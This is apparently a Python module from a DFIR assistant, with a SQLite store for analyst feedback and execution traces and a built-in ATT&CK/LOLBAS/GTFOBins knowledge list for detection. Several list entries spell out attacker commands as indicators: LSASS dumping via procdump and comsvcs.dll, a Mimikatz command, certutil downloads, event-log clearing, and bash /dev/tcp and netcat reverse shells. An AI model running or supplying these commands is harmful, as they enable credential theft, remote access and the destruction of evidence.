"""Knowledge and Memory Protocol & SQLite Provider for ForensicOps AI.

Defines the pluggable `KnowledgeAndMemoryProvider` protocol for episodic learning,
benign baseline suppression, and offline DFIR domain knowledge retrieval.
Implements `SQLiteFeedbackMemoryProvider` as the default MVP provider for seamless
zero-refactor upgrade to Qdrant Hybrid RAG in v2.0.

Standards: v2.0 RAG Architecture, NIST SP 800-86.
"""
from __future__ import annotations

import json
import re
import sqlite3
from pathlib import Path
from typing import Any, Dict, List, Optional, Protocol, Union, runtime_checkable

from backend.app.models.feedback import HumanFeedbackRecord, NodeExecutionTrace


# Curated offline DFIR domain knowledge base (MITRE ATT&CK, LOLBAS, GTFOBins, Event IDs)
DEFAULT_DFIR_KNOWLEDGE: List[Dict[str, Any]] = [
    {
        "id": "MITRE-T1059",
        "title": "T1059 - Command and Scripting Interpreter",
        "category": "execution",
        "artifact_types": ["evtx", "process", "command_line"],
        "content": (
            "MITRE ATT&CK T1059: Adversaries abuse command and script interpreters (PowerShell, Bash, cmd.exe) "
            "to execute commands. Look for encoded commands (-enc, -EncodedCommand), hidden windows (-w hidden), "
            "or process execution spawned by web servers (w3wp.exe, nginx, apache)."
        ),
    },
    {
        "id": "MITRE-T1053",
        "title": "T1053 - Scheduled Task/Job",
        "category": "persistence",
        "artifact_types": ["evtx", "registry", "persistence"],
        "content": (
            "MITRE ATT&CK T1053: Adversaries configure scheduled tasks (schtasks.exe, at, cron) to execute malicious "
            "code on fixed intervals or system startup. Event ID 4698 indicates task creation in Windows."
        ),
    },
    {
        "id": "MITRE-T1543",
        "title": "T1543 - Create or Modify System Process: Windows Service",
        "category": "persistence",
        "artifact_types": ["evtx", "registry", "service"],
        "content": (
            "MITRE ATT&CK T1543: Adversaries create or modify Windows Services (sc.exe create, New-Service) "
            "for persistent SYSTEM privilege execution. Monitored via Event ID 7045 (A service was installed in the system)."
        ),
    },
    {
        "id": "MITRE-T1003",
        "title": "T1003 - OS Credential Dumping",
        "category": "credential_access",
        "artifact_types": ["process", "memory", "evtx"],
        "content": (
            "MITRE ATT&CK T1003: Adversaries dump credentials from LSASS memory, SAM hive, or ntds.dit. "
            "Indicators include procdump.exe -ma lsass.exe, comsvcs.dll MiniDump, and Mimikatz sekurlsa::logonpasswords."
        ),
    },
    {
        "id": "MITRE-T1562",
        "title": "T1562 - Impair Defenses: Clear Event Logs",
        "category": "defense_evasion",
        "artifact_types": ["evtx", "process"],
        "content": (
            "MITRE ATT&CK T1562: Adversaries clear security event logs (wevtutil.exe cl Security, Clear-EventLog) "
            "to cover their tracks. Monitored via Event ID 1102 (The audit log was cleared)."
        ),
    },
    {
        "id": "LOLBAS-CERTUTIL",
        "title": "LOLBAS: certutil.exe",
        "category": "ingress_tool_transfer",
        "artifact_types": ["process", "command_line"],
        "content": (
            "LOLBAS certutil.exe: Often abused for file download and base64 decoding. "
            "Suspicious flags: 'certutil.exe -urlcache -split -f <URL> <outfile>' and 'certutil.exe -decode <in> <out>'."
        ),
    },
    {
        "id": "LOLBAS-MSHTA",
        "title": "LOLBAS: mshta.exe",
        "category": "execution",
        "artifact_types": ["process", "command_line"],
        "content": (
            "LOLBAS mshta.exe: Executes Microsoft HTML Applications (.hta). Adversaries abuse it to execute remote "
            "inline VBScript or JScript: 'mshta.exe javascript:...;GetObject('script:http://...').'"
        ),
    },
    {
        "id": "LOLBAS-RUNDLL32",
        "title": "LOLBAS: rundll32.exe",
        "category": "defense_evasion",
        "artifact_types": ["process", "command_line"],
        "content": (
            "LOLBAS rundll32.exe: Runs 32-bit/64-bit DLL exports. Adversaries abuse it to bypass execution policies: "
            "'rundll32.exe <payload.dll>,<ExportFunction>' or with comsvcs.dll for LSASS dumping."
        ),
    },
    {
        "id": "EVENT-4624",
        "title": "Windows Event ID 4624 - Successful Logon",
        "category": "authentication",
        "artifact_types": ["evtx", "authentication"],
        "content": (
            "Event ID 4624: Account successfully logged on. Critical Logon Types: Type 2 (Interactive/Local console), "
            "Type 3 (Network logon e.g. SMB/psexec), Type 10 (RemoteInteractive/RDP). Inspect TargetUserName and IpAddress."
        ),
    },
    {
        "id": "EVENT-4625",
        "title": "Windows Event ID 4625 - Failed Logon",
        "category": "authentication",
        "artifact_types": ["evtx", "authentication"],
        "content": (
            "Event ID 4625: Account failed to log on. Indicators of brute force or password spraying. "
            "Status codes: 0xC000006D (bad username/password), 0xC0000064 (user account does not exist)."
        ),
    },
    {
        "id": "EVENT-4688",
        "title": "Windows Event ID 4688 - Process Creation",
        "category": "process_creation",
        "artifact_types": ["evtx", "process"],
        "content": (
            "Event ID 4688: A new process has been created. When command line auditing is enabled, "
            "ProcessCommandLine reveals arguments, paths, and parent-child execution lineages (CreatorProcessName)."
        ),
    },
    {
        "id": "EVENT-7045",
        "title": "Windows Event ID 7045 - Service Installed",
        "category": "persistence",
        "artifact_types": ["evtx", "service"],
        "content": (
            "Event ID 7045: A service was installed in the system. High-signal persistence indicator. "
            "Inspect ServiceName, ServiceFileName (ImagePath), and ServiceType (kernel driver vs user service)."
        ),
    },
    {
        "id": "GTFOBINS-REVERSESHELL",
        "title": "GTFOBins: Linux Reverse Shells",
        "category": "execution",
        "artifact_types": ["command_line", "process"],
        "content": (
            "GTFOBins Reverse Shells: Standard Unix utilities abused for outbound reverse connections: "
            "bash -i >& /dev/tcp/<ip>/<port> 0>&1, python -c 'import socket,subprocess,os;...', perl, nc -e /bin/sh."
        ),
    },
]


@runtime_checkable
class KnowledgeAndMemoryProvider(Protocol):
    """Protocol for DFIR domain knowledge, episodic memory, and human feedback persistence."""

    async def get_benign_baselines(
        self,
        org_id: str,
        artifact_type: Optional[str] = None,
        entities: Optional[List[str]] = None,
    ) -> List[Dict[str, Any]]:
        """Suppress known org false positives learned from human feedback without cross-case contamination."""
        ...

    async def get_similar_successful_traces(
        self,
        user_goal: str,
        artifact_types: Optional[List[str]] = None,
        top_k: int = 3,
    ) -> List[Dict[str, Any]]:
        """Episodic Few-Shot Learning: retrieve past human-approved Goal -> Query strategies."""
        ...

    async def retrieve_dfir_domain_knowledge(
        self,
        query: str,
        artifact_type: Optional[str] = None,
        top_k: int = 5,
    ) -> List[str]:
        """Offline DFIR RAG over MITRE ATT&CK, LOLBAS, GTFOBins, and Event ID cheat sheets."""
        ...

    async def record_human_feedback(self, feedback: HumanFeedbackRecord) -> None:
        """Capture human analyst feedback from UI micro-controls."""
        ...

    async def record_execution_trace(self, trace: NodeExecutionTrace) -> None:
        """Record an execution trace of an AI Goal node."""
        ...


class SQLiteFeedbackMemoryProvider:
    """Default MVP implementation of KnowledgeAndMemoryProvider using SQLite.

    Provides fast local storage and token-based retrieval for traces, human feedback,
    and built-in offline DFIR knowledge. Upgrades to Qdrant RAG in v2.0 with zero changes
    to callers.
    """

    def __init__(self, db_path: Optional[Union[str, Path]] = None):
        """Initialize provider. Uses ':memory:' if db_path is None."""
        if db_path is None or str(db_path) == ":memory:":
            self._db_path = ":memory:"
        else:
            p = Path(db_path)
            p.parent.mkdir(parents=True, exist_ok=True)
            self._db_path = str(p)

        self._conn = sqlite3.connect(self._db_path, check_same_thread=False)
        self._init_tables()
        self._knowledge_items = list(DEFAULT_DFIR_KNOWLEDGE)

    def _init_tables(self) -> None:
        """Create traces and feedback tables."""
        with self._conn:
            self._conn.execute(
                """
                CREATE TABLE IF NOT EXISTS execution_traces (
                    trace_id TEXT PRIMARY KEY,
                    case_id TEXT NOT NULL,
                    node_id TEXT NOT NULL,
                    user_goal TEXT NOT NULL,
                    incoming_pivots TEXT NOT NULL,
                    executed_queries TEXT NOT NULL,
                    cited_finding_ids TEXT NOT NULL,
                    human_rating REAL,
                    created_utc TEXT NOT NULL,
                    execution_metadata TEXT NOT NULL
                );
                """
            )
            self._conn.execute(
                """
                CREATE TABLE IF NOT EXISTS human_feedback (
                    feedback_id TEXT PRIMARY KEY,
                    case_id TEXT,
                    finding_id TEXT,
                    feedback_type TEXT NOT NULL,
                    analyst_note TEXT,
                    entity_pattern TEXT,
                    scope TEXT NOT NULL,
                    org_id TEXT,
                    artifact_type TEXT,
                    created_utc TEXT NOT NULL,
                    corrected_query TEXT
                );
                """
            )
            self._conn.execute("CREATE INDEX IF NOT EXISTS idx_tr_case ON execution_traces(case_id);")
            self._conn.execute("CREATE INDEX IF NOT EXISTS idx_fb_org ON human_feedback(org_id);")
            self._conn.execute("CREATE INDEX IF NOT EXISTS idx_fb_scope ON human_feedback(scope);")

    async def record_execution_trace(self, trace: NodeExecutionTrace) -> None:
        """Save a node execution trace."""
        with self._conn:
            self._conn.execute(
                """
                INSERT OR REPLACE INTO execution_traces (
                    trace_id, case_id, node_id, user_goal, incoming_pivots,
                    executed_queries, cited_finding_ids, human_rating,
                    created_utc, execution_metadata
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
                """,
                (
                    trace.trace_id,
                    trace.case_id,
                    trace.node_id,
                    trace.user_goal,
                    json.dumps(trace.incoming_pivots, ensure_ascii=False),
                    json.dumps(trace.executed_queries, ensure_ascii=False),
                    json.dumps(trace.cited_finding_ids, ensure_ascii=False),
                    trace.human_rating,
                    trace.created_utc,
                    json.dumps(trace.execution_metadata, ensure_ascii=False),
                ),
            )

    async def record_human_feedback(self, feedback: HumanFeedbackRecord) -> None:
        """Save a human feedback record."""
        with self._conn:
            self._conn.execute(
                """
                INSERT OR REPLACE INTO human_feedback (
                    feedback_id, case_id, finding_id, feedback_type,
                    analyst_note, entity_pattern, scope, org_id,
                    artifact_type, created_utc, corrected_query
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);
                """,
                (
                    feedback.feedback_id,
                    feedback.case_id,
                    feedback.finding_id,
                    feedback.feedback_type,
                    feedback.analyst_note,
                    feedback.entity_pattern,
                    feedback.scope,
                    feedback.org_id,
                    feedback.artifact_type,
                    feedback.created_utc,
                    feedback.corrected_query,
                ),
            )

    async def get_benign_baselines(
        self,
        org_id: str,
        artifact_type: Optional[str] = None,
        entities: Optional[List[str]] = None,
    ) -> List[Dict[str, Any]]:
        """Retrieve organization or global false positive baselines."""
        sql = """
            SELECT feedback_id, entity_pattern, analyst_note, artifact_type, scope, org_id
            FROM human_feedback
            WHERE feedback_type = 'false_positive_benign_baseline'
              AND (org_id = ? OR scope = 'global_playbook')
        """
        params: List[Any] = [org_id]

        if artifact_type:
            sql += " AND (artifact_type IS NULL OR artifact_type = ?)"
            params.append(artifact_type)

        cursor = self._conn.execute(sql, params)
        rows = cursor.fetchall()

        results = []
        for r in rows:
            entry = {
                "feedback_id": r[0],
                "entity_pattern": r[1],
                "analyst_note": r[2],
                "artifact_type": r[3],
                "scope": r[4],
                "org_id": r[5],
            }
            if entities and entry["entity_pattern"]:
                # If specific entities requested, filter if entity matches pattern
                pattern_lower = entry["entity_pattern"].lower()
                matched = any(pattern_lower in str(e).lower() or str(e).lower() in pattern_lower for e in entities)
                if matched:
                    results.append(entry)
            else:
                results.append(entry)

        return results

    async def get_similar_successful_traces(
        self,
        user_goal: str,
        artifact_types: Optional[List[str]] = None,
        top_k: int = 3,
    ) -> List[Dict[str, Any]]:
        """Retrieve successful past execution traces matching the goal for few-shot prompting."""
        # Query traces with positive rating (>= 0.7 or rating IS NULL if default)
        cursor = self._conn.execute(
            """
            SELECT trace_id, case_id, node_id, user_goal, incoming_pivots,
                   executed_queries, cited_finding_ids, human_rating
            FROM execution_traces
            WHERE human_rating IS NULL OR human_rating >= 0.7;
            """
        )
        rows = cursor.fetchall()
        if not rows:
            return []

        goal_tokens = set(re.findall(r"\w+", user_goal.lower()))
        scored_traces = []

        for r in rows:
            past_goal = r[3]
            past_tokens = set(re.findall(r"\w+", past_goal.lower()))
            overlap = len(goal_tokens & past_tokens)
            score = overlap / max(len(goal_tokens | past_tokens), 1)

            if r[7] is not None:
                score += float(r[7]) * 0.2

            trace_data = {
                "trace_id": r[0],
                "case_id": r[1],
                "node_id": r[2],
                "user_goal": r[3],
                "incoming_pivots": json.loads(r[4]) if r[4] else {},
                "executed_queries": json.loads(r[5]) if r[5] else [],
                "cited_finding_ids": json.loads(r[6]) if r[6] else [],
                "human_rating": r[7],
                "similarity_score": round(score, 4),
            }
            scored_traces.append((score, trace_data))

        scored_traces.sort(key=lambda item: item[0], reverse=True)
        return [t for _, t in scored_traces[:top_k]]

    async def retrieve_dfir_domain_knowledge(
        self,
        query: str,
        artifact_type: Optional[str] = None,
        top_k: int = 5,
    ) -> List[str]:
        """Match query against built-in offline DFIR knowledge items."""
        if not query or not query.strip():
            return []

        query_tokens = set(re.findall(r"\w+", query.lower()))
        scored_items = []

        for item in self._knowledge_items:
            # Check artifact_type filtering if specified
            if artifact_type and artifact_type not in item.get("artifact_types", []):
                continue

            text_to_search = f"{item['title']} {item['content']} {' '.join(item.get('artifact_types', []))}".lower()
            item_tokens = set(re.findall(r"\w+", text_to_search))

            overlap = len(query_tokens & item_tokens)
            if overlap == 0:
                continue

            score = overlap / max(len(query_tokens), 1)
            # Exact title or id match boost
            if item["id"].lower() in query.lower() or item["title"].lower() in query.lower():
                score += 2.0

            formatted = f"[{item['id']}] {item['title']}: {item['content']}"
            scored_items.append((score, formatted))

        scored_items.sort(key=lambda x: x[0], reverse=True)
        return [content for _, content in scored_items[:top_k]]

    def add_domain_knowledge_item(self, item: Dict[str, Any]) -> None:
        """Add a custom DFIR knowledge item to the in-memory catalog."""
        self._knowledge_items.append(item)

    def close(self) -> None:
        """Close SQLite database connection."""
        if hasattr(self, "_conn") and self._conn:
            self._conn.close()
